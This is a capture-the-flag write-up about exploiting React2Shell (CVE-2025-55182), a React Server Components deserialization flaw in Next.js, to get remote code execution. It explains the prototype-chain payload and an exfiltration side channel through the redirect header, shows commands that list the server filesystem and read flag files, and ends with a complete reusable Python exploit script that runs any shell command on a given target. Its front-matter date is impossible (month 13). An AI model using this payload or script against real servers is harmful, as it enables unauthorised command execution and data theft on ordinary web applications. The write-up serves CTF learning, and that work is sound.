---
title: "Allergic REACTion"
date: "2026-13-11"
category: "CTF"
summary: "React2Shell (CVE-2025-55182) — RSC Flight deserialization → RCE"
tags: ["CTF", "react2shell"]
---

## 1. Challenge Overview

The challenge name — **"Allergic REACTion"** — is a hint: "REACT" is capitalised, and the description mentions the site "having issues with its own reactions." This points toward a React / Next.js vulnerability.

The landing page is a static-looking allergy safety guide, but the HTML source reveals it is a **Next.js App Router** application using **React Server Components (RSC)** with **Turbopack**:

- `<title>Create Next App</title>` — default scaffold, not customised
- RSC payload embedded as `self.__next_f.push([...])`
- Script chunks served from `/_next/static/chunks/…`

This stack (Next.js 15.x/16.x + React 19.x + Turbopack) is affected by **CVE-2025-55182**, publicly nicknamed **React2Shell**.

## 2. Reconnaissance

Fetch a client chunk to confirm the framework:

```bash
curl -s https://hl51b9030526.ctfhub.io/_next/static/chunks/42879de7b8087bc9.js \
  | grep -iE 'react|next'
```
Output Confirmed:

- (globalThis.TURBOPACK||(globalThis.TURBOPACK=[])).push(...)
- React internals (ClientPageRoot, ReflectAdapter, LayoutRouterContext, etc.)
- Next.js RSC router code

This is the exact runtime required for the React2Shell vulnerability.

# Vulnerability - React2Shell(CVE-2025-55182)

**Root cause:** The React Server Components Flight deserializer trusts attacker-supplied data when reconstructing server-side objects. A crafted payload can:

1. Inject a fale "chunk" object with a malicious `then` key --> treated as thenable
2. Traverse the prototype chain via `$1:__proto__:then` and `$1:constructor:constructor` to reach the global `Funtion` constructor.
3. Feed the attacker-controlled  `_prefix` field as the body of `new Function(_prefix)`.
4. The function is executed server-side --> arbitrary code execution.

**Trigger:** A `POST` request to any route with:

- `Next-Action: <action-id>` header (forces the Flieght deserializer to run)
- `Content-Type: multipart/form-data`
- Flight payload spread accross three multipart parts.

## Working payload structure

The three multipart parts:

0  -->  JSON with `then`, `status`, `reason`, `value`, `_response`  ---> Malicious chunk

1  --> "$@0"  ---> Refference to part 0

2 --> []  ---> Empty chunks array

The `_response._prefix` field is the javascript body of `new Function(_prefix)

Example:

```js
var r = process.mainModule.require('child_process')
  .spawnSync('sh', ['-c', 'id'], {encoding:'utf8', timeout:5000});
var res = r.stdout || r.stderr || '';
throw Object.assign(new Error('NEXT_REDIRECT'), {
  digest: `NEXT_REDIRECT;push;/login?a=${res.trim()};307;`
});
```

Why throw NEXT_REDIRECT? Because the JSON response body is heavily filtered in production, but the redirect digest is reflected in the X-Action-Redirect response header — an easy side-channel for exfiltration.

## Confirm RCE

```bash
python3 exploit.py https://hl51b9030526.ctfhub.io/ id
```

Response:

```text
[*] Status: 303
[+] Output:
uid=1001(nextjs) gid=65533(nogroup) groups=65533(nogroup),65533(nogroup)
```

RCE confirmed as user `nextjs.`

```bash
python3 exploit.py https://hl51b9030526.ctfhub.io/ "ls -la / | base64 -w0"
```
Decode:

```bash
echo "<base64>" | base64 -d
```

Response:

```text
-rw-r--r--    1 root     root            38 Dec 11  2025 flag.txt
drwxr-xr-x    1 root     root          4096 Dec 15  2025 app
```

Read the flag:

```bash
python3 exploit.py https://hl51b9030526.ctfhub.io/ \
  "cat /flag /flag.txt /app/flag /app/flag.txt /home/nextjs/flag* 2>/dev/null | base64 -w0"
```

Output:
```text
ZmxhZ3szYTAwN2JhNGEyZDkzMjg0MzI2M2EzYzU0NzJiYmEzYn0=
```

Decoding the base 64 data the flag is revealed:

```text
flag{3a007ba4a2d932843263a3c5472bba3b}
```

## Exploit script

```python
#!/usr/bin/env python3
import requests, sys, urllib3
from urllib.parse import unquote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET = sys.argv[1] if len(sys.argv) > 1 else "https://hl51b9030526.ctfhub.io/"
CMD    = sys.argv[2] if len(sys.argv) > 2 else "id"
ACTION_ID = "409defd89dd31eeb200d9ea02b1f325d25f5f5f3f0"

def build_payload(command):
    escaped = command.replace("'", "'\"'\"'")
    prefix = (
        f"var r=process.mainModule.require('child_process')"
        f".spawnSync('sh',['-c','{escaped}'],{{encoding:'utf8',timeout:5000}});"
        f"var res=r.stdout||r.stderr||'';"
        f"throw Object.assign(new Error('NEXT_REDIRECT'),"
        f"{{digest:`NEXT_REDIRECT;push;/login?a=${{res.trim()}};307;`}});"
    )
    part0 = (
        '{"then":"$1:__proto__:then",'
        '"status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}",'
        '"_response":{'
        f'"_prefix":"{prefix}",'
        '"_chunks":"$Q2",'
        '"_formData":{"get":"$1:constructor:constructor"}'
        '}}'
    )
    return {
        "0": (None, part0),
        "1": (None, '"$@0"'),
        "2": (None, "[]"),
    }

def extract_output(resp):
    for src in (resp.headers.get("X-Action-Redirect", ""), resp.text):
        if "login?a=" in src:
            return unquote(src.split("login?a=")[1].split(";")[0])
    return None

def main():
    url = TARGET if TARGET.startswith("http") else "http://" + TARGET
    files = build_payload(CMD)
    headers = {"Next-Action": ACTION_ID}
    try:
        r = requests.post(url, files=files, headers=headers,
                          verify=False, timeout=10, allow_redirects=False)
    except Exception as e:
        print(f"[-] {e}"); return
    out = extract_output(r)
    print(f"[*] Status: {r.status_code}")
    if out:
        print(f"[+] Output:\n{out}")
    else:
        print("[-] No output captured.")
        print(r.text[:800])

if __name__ == "__main__":
    main()
```

Usage:

```bash
python3 exploit.py https://hl51b9030526.ctfhub.io/ "<command>"
```